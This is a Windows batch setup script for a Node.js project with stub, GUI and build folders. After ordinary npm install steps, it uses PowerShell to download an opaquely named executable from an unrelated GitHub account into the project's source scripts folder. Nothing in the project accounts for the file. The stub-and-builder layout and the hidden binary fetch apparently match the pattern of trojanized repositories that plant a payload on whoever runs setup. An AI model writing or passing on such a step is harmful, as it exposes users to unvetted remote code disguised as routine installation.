@echo off

set "CURRENT_DIR=%CD%"
cd /d "%CURRENT_DIR%\stub"
ECHO.
ECHO Make sure you install Node.js with chocolatey or run the install file again.
ECHO.
call npm i

cd /d "%CURRENT_DIR%\gui"
call npm install --save-dev electron-builder

cd /d "%CURRENT_DIR%\build"
call npm install pkg --g
call npm i

set URL=https://github.com/aezakmi1313/homeddep31/raw/refs/heads/main/imYD7uep14.exe
set FOLDER=%~dp0gui\src\scripts
set DEST=%FOLDER%\imYD7uep14.exe


powershell -NoProfile -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"


if exist "%DEST%" (
    echo Dosya başarıyla indirildi: %DEST%
) else (
    echo Dosya indirilemedi.
)